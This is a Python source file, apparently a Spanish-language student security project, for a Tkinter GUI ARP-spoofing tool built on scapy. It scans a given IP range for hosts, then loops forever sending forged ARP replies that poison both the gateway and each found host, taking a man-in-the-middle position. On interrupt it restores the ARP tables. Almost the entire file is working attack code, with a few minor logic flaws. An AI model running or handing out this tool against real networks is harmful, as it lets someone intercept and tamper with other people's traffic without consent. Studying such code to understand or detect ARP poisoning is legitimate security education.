from tkinter import *
from tkinter import ttk
from scapy.all import *
from colorama import  Fore, init
from tkinter import messagebox as MessageBox
import sys
import time
import os


# ventana
ventana = Tk()
ventana.title("Proyecto Seguridad Informatica")
ventana.config(width=520, height=400)

# variables de Imagen
CountImage = 14
Imagen = [PhotoImage(file='hack3.gif',format = 'gif -index %i' %(i)) for i in range(CountImage)]

# variables de ip rango - gateway
ipgateway_var=StringVar()
iprango_var=StringVar()



# Obtencion de la dirección mac
def pedir_mac(gateway):
	arp_request = ARP(pdst=gateway)
	broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_request_broadcast = broadcast/arp_request
	mac = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
	return mac[0][1].hwsrc

# Funcion de escanear el Rango de IP
def escaneo_rango(rango, gateway):
	
	lista_hosts = dict()
	arp_request = ARP(pdst=rango)
	broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_request_broadcast = broadcast/arp_request
	answers = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
	MessageBox.showinfo("Encontrado!", "Host y Ip Encontrada")

	for a in answers:
		if a != gateway:
			print("[+] HOST: {} MAC: {}".format(a[1].psrc, a[1].hwsrc))
			label = Label(ventana, text= "[+] HOST: {} MAC: {}".format(a[1].psrc, a[1].hwsrc))
			label.place(x=20,y=110)
			lista_hosts.update({a[1].psrc: a[1].hwsrc})
	return lista_hosts

# Encargado de restaurar la red (Para que los dispositivos no se queden sin red)
def restaurar_red(destip, sourceip,hwsrc,hwdst):
	destination_mac = hwdst
	source_mac = hwsrc
	packet = ARP(op=2, pdst=destip, hwdst=destination_mac, psrc=sourceip, hwsrc=source_mac)
	send(packet, verbose=False)

# Funcion paquetes de arp - Spoofing
def spoofing(mac_gateway,tarjeta_ip,spoof_ip):
	packet = ARP(op=2, hwdst=mac_gateway, pdst=tarjeta_ip, psrc=spoof_ip)
	send(packet, verbose=False)

def main():

	ipgateway = ipgateway_var.get()
	iprango = iprango_var.get()
	if iprango and ipgateway:
		MessageBox.showinfo("Encontrado!", "Puerta de Enlace Encontrada")
		mac_gateway = pedir_mac(ipgateway)		
		labelmac = Label(ventana, text= "Puerta de Enlace: "+ mac_gateway)
		labelmac.pack() 
		labelmac.place(x=20,y=85) 
		imagen = PhotoImage(file='tenor2.gif' ,format='gif')
		labelImage=Label(ventana, image=imagen).place(x=150,y=150)
		hosts = escaneo_rango(iprango, ipgateway)
		resultado=MessageBox.askyesno("Encontrado!", "Iniciar Suplantacion de Ip ?")
		imagen = PhotoImage(file='tenor2.gif' ,format='gif')
		labelImage=Label(ventana, image=imagen).place(x=150,y=150)
		if resultado == False:
			quit()
		
		
		try:
			while True:
				for n in hosts:
					mac_target = hosts[n]
					ip_target = n
					gateway = ipgateway
					spoofing(mac_gateway, gateway, ip_target)
					spoofing(mac_target, ip_target,gateway)
					
					print("Suplantando..."+ip_target)											
					sys.stdout.flush()

		except KeyboardInterrupt:			
			print("\nRestaurando tablas ARP...")
			for n in hosts:
				mac_target = hosts[n]
				ip_target = n
				gateway = ipgateway
				restaurar_red(gateway, ip_target, mac_gateway,mac_target)
				restaurar_red(ip_target,gateway,mac_target,mac_gateway)
			
	else:
		 MessageBox.showinfo("Error!", "Introduce El Rango Ip y el Gateway") # título, mensaje



def update(ind):

    imagen = Imagen[ind]
    ind += 2
    if ind == CountImage:
        ind = 0
    label.configure(image=imagen)
    ventana.after(100, update, ind)
label = Label(ventana)
label.place(x=15,y=80)
ventana.after(0, update, 0)



# cajas de texto de ip y gateway and boton
TextoGateway=Label(ventana,text="Ingrese El ip - Gateway: ").place(x=20,y=10)
ipgateway_entry = Entry(ventana,textvariable = ipgateway_var, font=('calibre',10,'normal')).place(x=200,y=10)
TextoIPrango=Label(ventana,text="Ingrese El Rango de IP: ").place(x=20,y=40)
iprango_entry = Entry(ventana, textvariable = iprango_var, font = ('calibre',10,'normal')).place(x=200,y=40)
button = Button(ventana, text="Iniciar Spofing",command=main).place(x=380,y=20)



if __name__ == "__main__":
	ventana.mainloop()

